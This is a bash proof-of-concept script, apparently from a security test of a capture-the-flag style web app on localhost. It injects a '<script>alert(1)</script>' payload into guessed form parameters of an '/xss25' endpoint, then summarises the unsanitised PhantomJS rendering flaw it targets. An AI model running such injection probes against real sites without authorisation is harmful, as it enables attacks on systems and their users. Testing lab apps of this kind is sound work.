#!/bin/bash

# POC: Insecure Subprocess Execution - XSS in PhantomJS Context (v3)
# Based on evidence from app.py showing process_page() function with PhantomJS

TARGET="http://localhost:5000"
echo "[*] Testing PhantomJS XSS Injection Vulnerability"
echo "[*] Target: $TARGET"
echo ""
echo "[*] This POC demonstrates that user input is written to HTML files"
echo "[*] and processed by PhantomJS without sanitization."
echo ""

# Test the xss25 endpoint discovered in homepage
echo "[*] Step 1: Testing /xss25 endpoint with XSS payload"
echo "---"

# Try GET first to see the form
GET_RESP=$(curl -s -w "\nHTTP_STATUS:%{http_code}" "$TARGET/xss25")
GET_CODE=$(echo "$GET_RESP" | grep "HTTP_STATUS:" | cut -d: -f2)
GET_BODY=$(echo "$GET_RESP" | grep -v "HTTP_STATUS:")

echo "GET /xss25 - Status: $GET_CODE"
if [ "$GET_CODE" == "200" ]; then
    echo "[+] Endpoint accessible"
    echo "Page preview (first 30 lines):"
    echo "$GET_BODY" | head -30
    echo ""
    
    # Look for form parameters
    PARAMS=$(echo "$GET_BODY" | grep -oP 'name="\K[^"]+' | head -5)
    echo "Detected form parameters:"
    echo "$PARAMS"
    echo ""
fi

# Test with common XSS payload
echo "[*] Step 2: Injecting XSS payload into detected endpoints"
echo "---"

# XSS payload designed to trigger PhantomJS alert detection
XSS_PAYLOAD='<script>alert(1)</script>'

# Try multiple parameter names based on code review
for param in "xss" "content" "page" "input" "q" "search"; do
    echo "[*] Testing parameter: $param"
    
    POST_RESP=$(curl -s -w "\nHTTP_STATUS:%{http_code}" -X POST "$TARGET/xss25" \
      -H "Content-Type: application/x-www-form-urlencoded" \
      --data-urlencode "$param=$XSS_PAYLOAD")
    
    POST_CODE=$(echo "$POST_RESP" | grep "HTTP_STATUS:" | cut -d: -f2)
    POST_BODY=$(echo "$POST_RESP" | grep -v "HTTP_STATUS:")
    
    echo "  Status: $POST_CODE"
    
    if [ "$POST_CODE" == "200" ]; then
        echo "[+] POST accepted"
        echo "  Response excerpt:"
        echo "$POST_BODY" | head -15
        
        # Check for success indicators that PhantomJS detected the script
        if echo "$POST_BODY" | grep -Eq "flag|FLAG|congrat|Congrat|success|Success|You did it|Well done|correct"; then
            echo ""
            echo "[+++] VULNERABLE: Application response indicates JavaScript was processed!"
            echo "[+++] Parameter: $param"
            echo "[+++] Evidence: Success/flag message in response"
            echo "[+++] Full response:"
            echo "$POST_BODY"
            echo ""
        fi
    fi
    echo ""
done

echo ""
echo "========================================="
echo "[*] VULNERABILITY SUMMARY"
echo "========================================="
echo ""
echo "Based on source code analysis (app.py lines 27-38):"
echo ""
echo "1. User input is accepted via web form parameters"
echo "2. The process_page() function writes this input directly to an HTML file:"
echo "   fn = 'static/' + os.urandom(16).encode('hex') + '.html'"
echo "   of.write(page)  # No sanitization!"
echo ""
echo "3. PhantomJS processes this file via check.js:"
echo "   subprocess.Popen(['timeout','5','phantomjs', 'check.js'])"
echo ""
echo "4. Any JavaScript in the user input executes in PhantomJS context"
echo ""
echo "IMPACT:"
echo "- XSS execution in PhantomJS context"
echo "- Potential access to data processed by PhantomJS"
echo "- DoS via resource-intensive JavaScript"
echo "- Race condition attacks via predictable filenames"
echo ""
echo "AFFECTED CODE:"
echo "  File: /home/daytona/repo/src/app.py"
echo "  Function: process_page()"
echo "  Lines: 27-38"
echo "========================================="